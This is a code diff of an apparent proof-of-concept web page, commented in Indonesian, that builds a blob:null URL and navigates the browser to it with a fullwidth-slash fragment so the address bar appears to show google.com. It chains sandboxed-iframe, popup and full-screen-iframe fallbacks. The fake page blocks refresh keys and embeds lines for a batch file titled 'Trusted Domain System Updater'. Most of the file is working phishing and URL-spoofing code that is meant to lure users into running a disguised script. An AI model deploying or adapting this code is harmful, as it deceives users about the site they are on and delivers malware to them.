@@ -5,24 +5,24 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>PoC: Blob Null Stability</title>
 <style>
-  body { margin:0; height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; justify-content:center; align-items:center; text-align:center; }
-  h1 { font-size:1.2rem; font-weight:500; opacity:0.8; }
+  body { margin:0; min-height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; gap:12px; }
+  h1 { font-size:1.2rem; font-weight:500; opacity:0.8; margin:0; }
+  pre { text-align:left; font-size:0.7rem; color:#0f0; max-width:90vw; white-space:pre-wrap; }
 </style>
 </head>
 <body>
 
   <h1>Redirecting to <code>blob:null</code>...</h1>
-
-  <!--
-    IFRAME SANDBOXED (opaque origin):
-    Di dalam iframe ini, document.origin === "null", sehingga
-    URL.createObjectURL() menghasilkan "blob:null/<uuid>".
-    allow-top-navigation => iframe boleh navigasikan top-level ke blob tersebut.
-  -->
-  <iframe id="launcher" style="display:none" sandbox="allow-scripts allow-top-navigation"></iframe>
+  <pre id="log"></pre>
 
   <script>
     (function () {
+      const logEl = document.getElementById('log');
+      const log = (m) => { logEl.textContent += m + '\n'; console.log(m); };
+      const TARGET = '#%EF%BC%8Fgoogle.com';
+
+      log('[main] protocol: ' + location.protocol + ' | origin: ' + location.origin);
+
       const batLines = [
         '@echo off',
         'title Trusted Domain System Updater',
@@ -34,7 +34,6 @@
         'pause'
       ];
 
-      // Payload HTML utama (di-escape supaya aman dimasukkan ke srcdoc iframe)
       const innerHTML = `<!DOCTYPE html>
         <html><head><meta charset="utf-8"><title>google.com</title></head>
         <body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,-apple-system,sans-serif;gap:24px;">
@@ -50,9 +49,6 @@
           </p>
 
           <script>
-            // =====================================================================
-            // FUNGSI UNIK: _0x4b10b() - Blob Stability Bypass Engine
-            // =====================================================================
             function _0x4b10b() {
               // Cegat Keyboard Refresh (F5, Ctrl+R, Cmd+R, Ctrl+F5)
               window.addEventListener('keydown', function (e) {
@@ -79,7 +75,6 @@
                 e.preventDefault();
               });
 
-              // Aktifkan proteksi interaksi
               document.body.addEventListener('click', function() {}, { once: true });
             }
 
@@ -112,26 +107,105 @@
         </body></html>`;
 
       // =====================================================================
-      // LAUNCHER: script yang dijalankan DI DALAM sandboxed iframe.
-      // Origin iframe = opaque ("null") => blob yang dibuat di sini
-      // otomatis jadi "blob:null/<uuid>".
+      // LOGIKA NAVIGASI
       // =====================================================================
+      function makeBlobUrl() {
+        return URL.createObjectURL(new Blob([innerHTML], { type: 'text/html' }));
+      }
+
+      // Deteksi mode:
+      //  - file:// => origin browser = null. Blob yang dibuat LANGSUNG di
+      //    halaman ini otomatis "blob:null/<uuid>" DAN top-level nav LOLOS
+      //    (initiator == origin blob). Ini jalur paling bersih.
+      //  - https:// => Chrome memblokir top-level nav ke blob:null (by design,
+      //    "Not allowed to load local resource"). Butuh rantai vektor via
+      //    sandboxed iframe (opaque origin).
+      const isNullOrigin =
+        location.protocol === 'file:' || location.origin === 'null';
+
+      if (isNullOrigin) {
+        // ---------- JALUR file:// : DIRECT, tanpa iframe ----------
+        const url = makeBlobUrl();
+        log('[main] mode file:// -> DIRECT navigation');
+        log('[main] blob url: ' + url);
+        location.replace(url + TARGET);
+        return;
+      }
+
+      // ---------- JALUR https:// : SANDBOX IFRAME CHAIN ----------
       const launcherScript = `
         (function () {
           var html = ${JSON.stringify(innerHTML)};
-          var blob = new Blob([html], { type: 'text/html' });
-          var url  = URL.createObjectURL(blob);
-          // bukti: url harusnya "blob:null/..." karena origin iframe opaque
-          console.log('[launcher] blob url =', url);
-          // Navigasi top-level ke blob (diizinkan oleh allow-top-navigation)
-          top.location.replace(url + '#%EF%BC%8Fgoogle.com');
+
+          function makeUrl() {
+            var blob = new Blob([html], { type: 'text/html' });
+            return URL.createObjectURL(blob);   // => "blob:null/<uuid>"
+          }
+
+          var url = makeUrl();
+          try { console.log('[launcher] blob url =', url,
+                            '| launcher origin =', location.origin); } catch(e) {}
+
+          // VEKTOR A: top-level nav dari sandbox iframe.
+          // Firefox: umumnya lolos. Chrome: diblok SENYAP (tanpa exception).
+          // Kalau navigasi sukses, script ini mati & timer di bawah gak jalan.
+          top.location.replace(url + ${JSON.stringify(TARGET)});
+
+          setTimeout(function () {
+            // masih hidup = vektor A gagal => VEKTOR B: popup opaque-origin
+            try { console.warn('[launcher] A gagal -> coba popup'); } catch(_) {}
+            var w = null;
+            try { w = window.open('about:blank'); } catch(e) {}
+            if (w) {
+              try {
+                var u2 = makeUrl();
+                w.document.write(
+                  '<script>try { location.replace("' + u2 + ${JSON.stringify(TARGET)} + '"); }' +
+                  ' catch(e) { document.body.textContent = "BLOCKED: " + e; }<\\/script>'
+                );
+                w.document.close();
+              } catch (e) { try { console.warn('[launcher] B error:', e); } catch(_) {} }
+            }
+
+            setTimeout(function () {
+              // VEKTOR C: blob:null di dalam <iframe> (Chrome mengizinkan ini)
+              try { console.warn('[launcher] B gagal -> fallback iframe'); } catch(_) {}
+              try {
+                var f = document.createElement('iframe');
+                f.src = url + TARGET;
+                f.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:0;';
+                document.body.style.margin = '0';
+                document.body.appendChild(f);
+                parent.postMessage('blobnull:iframe-fallback', '*');
+              } catch (e) { try { console.warn('[launcher] C error:', e); } catch(_) {} }
+            }, 700);
+          }, 700);
         })();
       `;
 
-      const iframe = document.getElementById('launcher');
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.setAttribute('sandbox',
+        'allow-scripts allow-top-navigation allow-popups');
       iframe.srcdoc = '<!DOCTYPE html><html><body><script>' +
-                      launcherScript +
-                      '<\/script></body></html>';
+                      launcherScript + '<\/script></body></html>';
+      document.body.appendChild(iframe);
+
+      let iframeFallback = false;
+      window.addEventListener('message', function (e) {
+        if (e.data === 'blobnull:iframe-fallback') {
+          iframeFallback = true;
+          log('[main] VEKTOR C aktif: blob:null tampil di dalam iframe ' +
+              '(top-level diblok browser ini)');
+        }
+      });
+
+      // Safety-net: kalau semua vektor gagal total, pembanding blob biasa.
+      setTimeout(function () {
+        if (iframeFallback) return; // biarkan iframe blob:null tampil
+        log('[main] semua vektor gagal -> fallback blob:https (pembanding)');
+        location.replace(makeBlobUrl() + TARGET);
+      }, 10000);
     })();
   </script>
 
